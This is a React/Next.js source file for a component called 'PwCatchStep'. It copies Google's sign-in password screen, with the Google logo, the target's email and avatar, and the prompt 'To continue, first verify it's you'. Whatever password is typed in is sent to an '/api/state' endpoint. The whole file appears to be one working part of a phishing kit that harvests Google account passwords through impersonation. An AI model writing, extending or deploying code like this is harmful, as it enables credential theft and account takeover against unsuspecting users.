"use client";

import { useState } from "react";
import { useForm, type SubmitHandler } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import Image from "next/image";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { UserCircle, ChevronDown } from "lucide-react";
import { Checkbox } from "@/components/ui/checkbox";

const passwordSchema = z.object({
  password: z.string().min(1, { message: "Please enter your password." }),
});
type PasswordFormData = z.infer<typeof passwordSchema>;

type PwCatchStepProps = {
  email: string;
  name: string;
  profilePicture: string;
};

export default function PwCatchStep({ email, name, profilePicture }: PwCatchStepProps) {
  const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
  });
  const { toast } = useToast();
  const [showPassword, setShowPassword] = useState(false);

  const onSubmit: SubmitHandler<PasswordFormData> = async (data) => {
    try {
      const res = await fetch("/api/state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "submitPassword", password: data.password }),
      });
      if (!res.ok) throw new Error("Server responded with an error.");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Could not proceed. Please try again.",
      });
    }
  };

  return (
    <div className="w-full max-w-md mx-auto text-center">
        <img width="48" height="48" src="https://img.icons8.com/color/48/google-logo.png" alt="google-logo" className="mb-4 mx-auto"/>
        <h1 className="text-3xl font-normal">Welcome</h1>
         <div className="mt-4 flex items-center justify-center gap-2 rounded-full border p-1 pr-3 w-fit mx-auto">
            <div className="flex items-center gap-2">
            {profilePicture ? (
                <Image 
                    src={profilePicture} 
                    alt={name || email} 
                    width={24} 
                    height={24} 
                    className="rounded-full object-cover w-6 h-6"
                    data-ai-hint="person avatar" 
                />
            ) : (
                <UserCircle className="h-6 w-6 text-muted-foreground"/>
            )}
            <span className="text-sm font-medium">{email}</span>
            </div>
            <ChevronDown className="h-4 w-4 text-muted-foreground" />
        </div>
        
        <p className="text-sm my-8 text-left">To continue, first verify it’s you</p>
        <form onSubmit={handleSubmit(onSubmit)} className="space-y-6 text-left">
            <div className="relative">
                <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    placeholder="Enter your password"
                    {...register("password")}
                    className="h-14 pt-2 text-base"
                />
                {errors.password && <p className="text-sm text-destructive mt-1 px-1">{errors.password.message}</p>}
            </div>

            <div className="flex items-center space-x-2">
                <Checkbox id="show-password" onCheckedChange={() => setShowPassword(!showPassword)} />
                <label
                    htmlFor="show-password"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                >
                    Show password
                </label>
            </div>
          
            <div className="flex justify-between items-center pt-4">
                <Button variant="ghost" className="text-primary -ml-4">Forgot password?</Button>
                <Button type="submit" disabled={isSubmitting}>
                    {isSubmitting ? "Verifying..." : "Next"}
                </Button>
            </div>
        </form>
    </div>
  );
}
